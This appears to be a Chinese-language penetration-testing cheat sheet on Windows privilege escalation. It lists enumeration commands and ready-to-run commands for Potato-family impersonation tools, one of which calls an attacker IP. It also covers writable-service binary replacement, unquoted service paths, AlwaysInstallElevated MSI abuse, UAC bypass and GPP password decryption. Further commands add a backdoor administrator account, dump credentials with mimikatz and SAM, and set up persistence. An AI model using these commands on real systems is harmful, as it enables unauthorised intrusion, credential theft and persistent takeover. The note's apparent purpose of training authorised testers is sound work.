# Windows 权限提升

## 1. 知识点讲解

Windows 提权攻击面：补丁缺失（内核 LPE）、服务与计划任务配置错误、令牌与模拟（Potato 家族）、凭据复用、域配置缺陷。先确认当前身份：`whoami /all`（组、特权）——`SeImpersonatePrivilege` 是黄金特权（服务账户几乎必有），直接对接 Potato 家族到 SYSTEM。

## 2. 信息枚举

```powershell
# 自动化
winPEASx64.exe / winPEAS.bat
.\PowerUp.ps1 → Invoke-AllChecks
.\SharpUp.exe audit
# 补丁比对（离线）
systeminfo > info.txt → wesng info.txt -i info.txt --exploits-only

# 人工核心清单
whoami /all
sc query; Get-CimInstance win32_service | ? {$_.PathName -notmatch "system32"}   # 第三方服务
icacls "C:\Program Files\..."      # 服务目录/二进制可写
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s   # 软件清单
cmdkey /list                       # 保存的凭据
dir /s *pass* *.config unattend.xml 2>nul   # 凭据文件
net user; net localgroup administrators
```

## 3. 高频提权路径

### Potato 家族（服务账户 → SYSTEM）
| 工具 | 适用系统 | 命令示例 |
| --- | --- | --- |
| JuicyPotato | Win7/2008 ~ Win10 1803 | `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\x" -t * -c {CLSID}` |
| RoguePotato | 之后版本（需可访问端口） | `RoguePotato.exe -r attackerIP -e "cmd /c whoami > c:\x" -l 9999` |
| GodPotato | Win8+ ~ Win11（含 2012-2022） | `GodPotato.exe -cmd "cmd /c whoami > c:\x"` |
| PrintSpoofer | 通杀老版本（Print Spooler 开启） | `PrintSpoofer64.exe -i -c cmd` |
| SweetPotato | 集合版（C#，内存执行） | `SweetPotato.exe -p whoami` |

判断链：`whoami /priv` 有 `SeImpersonate` → 按系统版本选 Potato → 执行 `cmd /c "net user h P@ss123 /add & net localgroup administrators h /add"`。

### 协议服务暴露 ≈ 近 RCE（2026-09 补丁日邻接）

未打 09-08 补丁时，下列**网络可达服务**本身就是未认证 RCE 面，不必先本地 LPE：

| 服务 | CVE（MSRC） | 识别 |
| --- | --- | --- |
| MSMQ | CVE-2026-83997 UAF | TCP **1801** |
| Netlogon（DC） | CVE-2026-72982 栈溢 | 域控网络 |
| SSTP / RRAS | CVE-2026-73009 UAF | VPN/隧道口 |

打点纪律：内网先问「这些角色是否在」再决定是协议打还是 Potato。禁止完整报文。来源：MSRC September 2026。

### 服务配置错误
```powershell
# 服务二进制可写
sc stop vulnsvc; copy evil.exe "C:\path\service.exe"; sc start vulnsvc
# 未加引号的路径
wmic service get name,pathname | findstr /i "program files"
# C:\Program Files\A B\svc.exe → 放 C:\Program Files\A.exe
# DLL 劫持：服务加载不存在的 DLL → 写同名 DLL 到搜索路径
```

### 其他高频点
- AlwaysInstallElevated（双注册表值为 1）：`msiexec /quiet /qn /i evil.msi`
- 计划任务以高权跑可写脚本。
- 注册表 AutoRun 以 SYSTEM 跑可写程序。
- 凭据：unattend.xml、Group Policy Preferences（cpassword，用 gpp-decrypt 解）、cmdkey /list → `runas /savecred`。
- UAC 绕过（管理员 → 高完整性）：fodhelper/computerdefaults 注册表劫持、bypassuac 模块——注意 UAC 绕过不是提权，是完整性级别提升。

## 4. 内核 LPE
对照 `09_漏洞库/02-提权漏洞速查.md`（PrintNightmare、HiveNightmare、**CVE-2026-68820 AFD.sys** 等）。规则：先 `wesng` 出缺失补丁列表再选 exp；生产环境慎用蓝屏风险的 exp。

> 2026-08 PT：CVE-2026-68820（AFD.sys UAF→SYSTEM）已在野，与钓鱼初始访问链叠加时补丁优先级极高。详见 `12_每周情报/2026-08-12_每周渗透情报.md`。

## 5. 提权后固化
- `net user` 影子账户 / 克隆管理员（07 分册）。
- 抓凭据衔接 05-02：`sekurlsa::logonpasswords`、SAM/SYSTEM dump。

## 自测锚点
- [ ] 看到 `SeImpersonatePrivilege` 能按 OS 版本选出正确 Potato 并写出完整命令。
- [ ] 能解释「未加引号服务路径」的利用条件与落点。
- [ ] 能区分「提权」与「UAC 绕过」的本质差异。
- [ ] 能说出 2026-09 补丁日至少 2 个「服务暴露即近 RCE」的协议角色（MSMQ / Netlogon / SSTP）。
